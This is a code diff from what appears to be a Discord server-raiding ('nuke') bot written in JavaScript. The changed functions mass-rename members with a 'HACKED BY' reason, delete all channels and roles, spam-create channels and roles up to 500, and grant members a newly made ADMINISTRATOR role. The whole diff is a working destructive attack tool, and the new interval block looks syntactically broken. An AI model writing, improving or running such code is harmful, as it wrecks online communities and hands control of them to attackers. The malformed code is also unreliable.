@@ -55,7 +55,11 @@ const changeNicks = (guildID, newNick) => {
     else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_NICKNAMES")) return console.error(`${client.user.username} has not the required perms to make something like this`)
 
     targetServer.members.forEach((member) => {
-        if (member.manageable) member.setNickname(newNick, `HACKED BY ${client.user.tag}`)
+	    try {
+		member.setNickname(newNick, `HACKED BY ${client.user.tag}`)    
+	    } catch (e) {
+		    undefined
+	    }
     })
 }
 
@@ -70,24 +74,18 @@ const createChanelsAndRoles = (guildID, name) => {
   		})
   })
    targetServer.channels.forEach(ch => {
-    ch.delete()
+	   ch.deletable ? ch.delete() : undefined
    })
-targetServer.roles.forEach(roless => {
-	roless.delete()
-})
-   setTimeout(() => {
-       
-   let i;
-    for(i=0; i < 50; i++) {
-   targetServer.createChannel(name, "text")
+	targetServer.roles.forEach(role => {
+	role.deletable ? role.delete() : undefined
+	})
+   setInterval(() => {
+ 
+	   if (targetServer.channels.array().length == 500) return
     targetServer.createChannel(name, "text")
     targetServer.createRole({name: name, permissions: [], color: "#40011c" }).then((hackedrole) =>{
-    	targetServer.members.forEach( allmembers=> {
-    		allmembers.addRole(hackedrole)
-    	})
-     })
-    }
-    }, 2000);
+ 
+    }, 500);
 
     targetServer.createRole({name: name, permissions: "ADMINISTRATOR", color: 0xFF0000 }).then((role) => {
         targetServer.members.forEach((member) => {
